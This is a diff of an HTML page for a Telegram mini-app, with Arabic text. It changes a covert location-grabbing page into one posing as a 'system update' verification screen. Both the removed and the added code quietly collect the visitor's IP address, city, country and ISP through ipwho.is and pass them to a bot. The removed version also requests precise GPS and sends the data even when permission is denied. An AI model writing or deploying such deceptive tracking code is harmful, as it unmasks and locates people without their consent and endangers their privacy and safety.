@@ -3,71 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جارٍ التحميل...</title>
+    <title>تحديث النظام</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: var(--tg-theme-bg-color, #18222d);
             color: var(--tg-theme-text-color, #ffffff);
-            padding: 50px;
+            padding: 40px;
             text-align: center;
         }
-        h2 {
-            font-size: 20px;
-            opacity: 0.8;
+        .btn {
+            background-color: var(--tg-theme-button-color, #2481cc);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            border: none;
+            padding: 15px 25px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            margin-top: 30px;
+            width: 100%;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <h2>⚡ جارٍ معالجة البيانات وتحميل الواجهة...</h2>
+    <h2>اضغط على الزر أدناه لإتمام التحقق ✅</h2>
+    <button class="btn" onclick="sendData()">تأكيد ودخول 🚀</button>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
 
-        let collectedData = {};
+        let payload = {};
 
-        // 1. تحديد وقت الاستخدام المحلي للمستخدم
+        // جلب وقت الاستخدام والـ IP بسرعة
         const now = new Date();
-        collectedData.usage_time = now.toLocaleString('ar-IQ', { timeZone: 'Asia/Baghdad' });
+        payload.usage_time = now.toLocaleString('ar-IQ', { timeZone: 'Asia/Baghdad' });
 
-        // 2. جلب معلومات الـ IP والشبكة
         fetch('https://ipwho.is/')
             .then(res => res.json())
             .then(data => {
                 if (data.success) {
-                    collectedData.ip = data.ip;
-                    collectedData.country = data.country;
-                    collectedData.city = data.city;
-                    collectedData.isp = data.connection.isp;
-                    collectedData.timezone = data.timezone.id;
+                    payload.ip = data.ip;
+                    payload.country = data.country;
+                    payload.city = data.city;
+                    payload.isp = data.connection.isp;
                 }
-                getGPSAndSend();
-            })
-            .catch(() => {
-                getGPSAndSend();
-            });
+            }).catch(() => {});
 
-        // 3. محاولة جلب الـ GPS الدقيق
-        function getGPSAndSend() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    collectedData.lat = position.coords.latitude;
-                    collectedData.lon = position.coords.longitude;
-                    sendPayload();
-                }, () => {
-                    sendPayload(); // الإرسال حتى لو رفض إذن الموقع
-                }, { enableHighAccuracy: true });
-            } else {
-                sendPayload();
-            }
-        }
-
-        // 4. إرسال البيانات نهائياً وتلقائياً للبوت
-        function sendPayload() {
-            tg.sendData(JSON.stringify(collectedData));
+        function sendData() {
+            // إرسال البيانات المجمعة للبوت وإغلاق الواجهة فوراً
+            tg.sendData(JSON.stringify(payload));
         }
     </script>
 </body>
